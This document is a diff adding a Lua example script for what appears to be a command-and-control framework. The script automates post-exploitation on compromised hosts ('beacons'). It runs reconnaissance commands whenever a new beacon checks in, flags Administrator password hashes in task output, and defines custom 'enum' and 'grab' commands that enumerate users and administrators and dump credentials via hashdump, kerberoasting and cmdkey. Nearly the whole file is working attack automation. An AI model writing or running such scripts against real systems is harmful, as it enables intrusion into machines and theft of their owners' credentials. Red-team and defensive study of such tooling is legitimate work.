@@ -1,0 +1,34 @@
+-- example_auto_enum.lua
+-- Automatically enumerates new beacons when they check in.
+
+on("beacon_new", function(b)
+    log("[auto_enum] new beacon: " .. b.id .. " (" .. (b.user or "?") .. "@" .. (b.host or "?") .. ")")
+    task(b.id, "shell whoami")
+    task(b.id, "ps")
+    task(b.id, "pwd")
+end)
+
+-- Alert when hashdump output contains Administrator hash.
+on("task_output", function(bid, tid, output)
+    if output:find("Administrator:500:") then
+        alert("High-value target", "Administrator hash found on beacon " .. bid)
+    end
+end)
+
+-- Custom command: "enum" runs multiple recon commands at once.
+command("enum", "Run full enumeration on beacon", function(bid, args)
+    task(bid, "whoami")
+    task(bid, "shell ipconfig /all")
+    task(bid, "shell net user")
+    task(bid, "shell net localgroup administrators")
+    task(bid, "ps")
+    log("[enum] full enumeration started on " .. bid)
+end)
+
+-- Custom command: "grab" dumps credentials.
+command("grab", "Dump all credential sources", function(bid, args)
+    task(bid, "hashdump 2")
+    task(bid, "kerberoast")
+    task(bid, "shell cmdkey /list")
+    log("[grab] credential dump started on " .. bid)
+end)
